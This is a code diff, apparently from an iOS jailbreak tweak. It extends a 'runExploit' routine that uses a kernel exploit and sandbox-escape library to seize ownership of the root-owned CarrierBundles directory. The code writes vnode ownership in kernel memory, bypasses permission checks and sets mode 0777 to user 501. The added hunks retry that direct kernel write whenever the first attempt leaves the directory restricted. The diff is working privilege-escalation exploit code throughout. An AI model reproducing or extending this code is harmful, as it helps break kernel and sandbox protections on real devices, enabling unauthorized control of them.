@@ -8,6 +8,8 @@
 
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/kutils.h"
+#include "kexploit/krw.h"
+#include "kexploit/offsets.h"
 #include "kexploit/vnode.h"
 #include "sandbox_escape.h"
 #include "apfs_own.h"
@@ -653,12 +655,39 @@ static void runExploit(void) {
         NSLog(@"[Tweak] CarrierBundles ownership before: uid=%u gid=%u mode=0%o",
               cbStat.st_uid, cbStat.st_gid, cbStat.st_mode & 0xFFFF);
 
-        // Step 1: Kernel-level root directory takeover.
+        // Step 1: Kernel-level root directory takeover via vnode name cache.
         // Uses get_vnode_for_path_kernel which bypasses DAC by walking the
-        // kernel name cache.  This succeeds even on root-owned 0700 directories
-        // that chdir/open would reject.  Sets mode=0777, uid=501, gid=501.
+        // kernel name cache (with /var -> /private/var symlink awareness).
+        // This succeeds even on root-owned 0700 directories that chdir/open
+        // would reject.  Sets mode=0777, uid=501, gid=501 on the root dir
+        // and any children reachable via the name cache.
         long kn = apfs_own_tree_kernel(cbPath, 501, 501);
         NSLog(@"[Tweak] CarrierBundles initial kernel walk: %ld entries processed", kn);
+
+        // Verify the root directory mode changed (sync has been called inside
+        // apfs_own_tree_kernel).  If the mode is still restrictive, try a
+        // direct single-entry kernel chown on just the root vnode.
+        {
+            struct stat verifyStat;
+            if (stat(cbPath, &verifyStat) == 0) {
+                NSLog(@"[Tweak] CarrierBundles after kernel walk: uid=%u gid=%u mode=0%o",
+                      verifyStat.st_uid, verifyStat.st_gid, verifyStat.st_mode & 0xFFFF);
+                if ((verifyStat.st_mode & 0777) != 0777) {
+                    NSLog(@"[Tweak] Root directory mode NOT 0777 after kernel walk, trying direct vnode write");
+                    uint64_t rv = get_vnode_for_path_kernel(cbPath);
+                    if (rv != (uint64_t)-1 && rv != 0) {
+                        if (apfs_own_vnode(rv, 501, 501) == 0) {
+                            sync();
+                            NSLog(@"[Tweak] Direct vnode write on root succeeded");
+                        } else {
+                            NSLog(@"[Tweak] Direct vnode write on root failed");
+                        }
+                    }
+                }
+            } else {
+                NSLog(@"[Tweak] Cannot stat CarrierBundles after kernel walk (errno=%d)", errno);
+            }
+        }
 
         // Step 2: Force-populate the vnode name cache by opening the directory
         // and reading all entries.  After Step 1 the root has mode=0777 so
@@ -669,19 +698,18 @@ static void runExploit(void) {
             if (populateDir) {
                 struct dirent *de;
                 while ((de = readdir(populateDir)) != NULL) {
-                    // readdir forces a vnode lookup, populating the name cache.
-                    // Build the full path to also populate deeper entries.
                     if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) continue;
                     char childPath[PATH_MAX];
                     snprintf(childPath, sizeof(childPath), "%s/%s", cbPath, de->d_name);
                     struct stat childStat;
                     if (stat(childPath, &childStat) == 0 && S_ISDIR(childStat.st_mode)) {
-                        // Recurse one level to populate grandchildren too
                         DIR *subDir = opendir(childPath);
                         if (subDir) {
                             struct dirent *subDe;
                             while ((subDe = readdir(subDir)) != NULL) { /* populates cache */ }
                             closedir(subDir);
+                        } else {
+                            NSLog(@"[Tweak] Could not opendir subdir %s (errno=%d)", childPath, errno);
                         }
                     }
                 }
@@ -689,6 +717,19 @@ static void runExploit(void) {
                 NSLog(@"[Tweak] CarrierBundles name cache populated via readdir");
             } else {
                 NSLog(@"[Tweak] Could not opendir %s after kernel takeover (errno=%d)", cbPath, errno);
+                // The kernel walk should have set mode=0777.  If opendir still
+                // fails, something is wrong with the root directory.  Try to
+                // force-mode it again.
+                NSLog(@"[Tweak] Forcing root directory mode via kernel write");
+                uint64_t rv = get_vnode_for_path_kernel(cbPath);
+                if (rv != (uint64_t)-1 && rv != 0) {
+                    if (apfs_own_vnode(rv, 501, 501) == 0) {
+                        sync();
+                        NSLog(@"[Tweak] Root directory mode force-written via apfs_own_vnode");
+                    } else {
+                        NSLog(@"[Tweak] apfs_own_vnode failed on root directory");
+                    }
+                }
             }
         }
 
